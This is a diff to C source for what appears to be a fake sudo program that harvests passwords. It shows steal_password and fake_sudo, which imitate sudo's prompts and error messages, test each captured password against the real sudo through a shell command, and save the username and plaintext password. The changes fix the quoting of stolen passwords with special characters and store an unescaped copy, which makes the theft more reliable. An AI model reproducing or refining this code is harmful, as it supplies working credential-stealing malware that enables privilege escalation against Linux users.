@@ -56,7 +56,7 @@ sudo(char arguments[])
     system(command);
 }
 
-ssize_t 
+ssize_t
 steal_password(char **lineptr, size_t *n, FILE *stream)
 {
     struct termios fakeTerminal, realTerminal;
@@ -77,21 +77,21 @@ steal_password(char **lineptr, size_t *n, FILE *stream)
     return 1;
 }
 
-char *strrpc(char *str,char *oldstr,char *newstr){
-    char bstr[strlen(str)];
+void
+strrpc(char **str,char *oldstr,char *newstr){
+    char bstr[4096];
     memset(bstr,0,sizeof(bstr));
  
-    for(int i = 0;i < strlen(str);i++){
-        if(!strncmp(str+i,oldstr,strlen(oldstr))){
+    for(int i = 0;i < strlen(*str);i++){
+        if(!strncmp(*str+i,oldstr,strlen(oldstr))){
             strcat(bstr,newstr);
             i += strlen(oldstr) - 1;
         }else{
-        	strncat(bstr,str + i,1);
+        	strncat(bstr,*str + i,1);
 	    }
     }
- 
-    strcpy(str,bstr);
-    return str;
+   *str = (char *) malloc(sizeof(bstr));
+   strcpy(*str,bstr);
 }
 
 
@@ -107,9 +107,6 @@ save_passwd(char *name,char *password,char *all, int success)
     }
 
     char text[BUFFER_LEN] = {0};
-
-    strrpc(password,"\\'","\'");
-    strrpc(password,"\\\"","\"");
 
     snprintf(text, sizeof(text), "%s:%s:%s\n", name, password, status); 
 
@@ -183,7 +180,8 @@ fake_sudo(struct passwd *usrInfo,int argc,char arguments[],char *params[])
     int retryTimes = 0;
     char testCommand[BUFFER_LEN] = {0};
     char *stealPasswd = NULL;
-    static char allPasswd[1000];
+    char *originPasswd = NULL;
+    static char allPasswd[4096];
     size_t len = 0;
 
     if (argc != 1)
@@ -196,10 +194,12 @@ fake_sudo(struct passwd *usrInfo,int argc,char arguments[],char *params[])
             int location =  strlen(stealPasswd)-1;
             if (stealPasswd[location] == '\n') stealPasswd[location] = '\0';
 
-            strrpc(stealPasswd,"\'","\\'");
-            strrpc(stealPasswd,"\"","\\\"");
+            originPasswd = (char *)malloc(len);
+            strcpy(originPasswd,stealPasswd);
 
-            snprintf(testCommand, sizeof(testCommand), "echo %s | /usr/bin/sudo -S whoami >/dev/null 2>&1",stealPasswd);
+            strrpc(&stealPasswd,"\'","\'\"\'\"\'");
+
+            snprintf(testCommand, sizeof(testCommand), "echo '%s' | /usr/bin/sudo -S whoami >/dev/null 2>&1",stealPasswd);
             printf("\n");
 
             int testret = system(testCommand);
@@ -209,12 +209,12 @@ fake_sudo(struct passwd *usrInfo,int argc,char arguments[],char *params[])
                 if (retryTimes == MAX_RETRY-1)
                 {
                     printf("sudo: %d incorrect password attempts\n", MAX_RETRY);
-                    save_passwd(usrInfo->pw_name,stealPasswd,allPasswd,0);
+                    save_passwd(usrInfo->pw_name,originPasswd,allPasswd,0);
                     return allPasswd;
                 }
 
                 printf("Sorry, try again.\n");
-                save_passwd(usrInfo->pw_name,stealPasswd,allPasswd,0);
+                save_passwd(usrInfo->pw_name,originPasswd,allPasswd,0);
             }
             else
             {
@@ -222,7 +222,7 @@ fake_sudo(struct passwd *usrInfo,int argc,char arguments[],char *params[])
                if (pid == 0)
                {
                    successFlag = 0;
-                   save_passwd(usrInfo->pw_name,stealPasswd,allPasswd,1);
+                   save_passwd(usrInfo->pw_name,originPasswd,allPasswd,1);
                    return allPasswd;
                } 
                else
@@ -232,6 +232,7 @@ fake_sudo(struct passwd *usrInfo,int argc,char arguments[],char *params[])
                }
             }
            retryTimes ++;
+           free(originPasswd);
         }
         //free(stealPasswd);
     }
